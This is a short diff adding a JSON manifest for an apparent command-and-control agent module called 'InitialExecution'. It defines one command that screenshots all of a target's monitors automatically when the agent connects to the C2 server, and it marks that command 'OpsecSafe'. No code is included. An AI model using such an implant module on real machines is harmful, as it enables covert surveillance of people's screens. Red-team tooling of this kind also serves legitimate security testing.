@@ -1,0 +1,15 @@
+{
+	"Name": "InitialExecution",
+	"Description": "Initial library that contains commands that should be executed once the agent is activated.",
+	"Authors": [
+		"DaWoschbar"
+	],
+	"Commands": [{
+		"Name": "MakeScreenshot",
+		"Description": "Make a screenshot of all monitors when the agent connects to the C2 server.",
+		"Help": "Make a screenshot of the current desktop.",
+		"OpsecSafe": "True",
+		"Parameters": []
+	}],
+	"BuildLocation": "./Builds/Debug/InitialExecution.dll"
+}
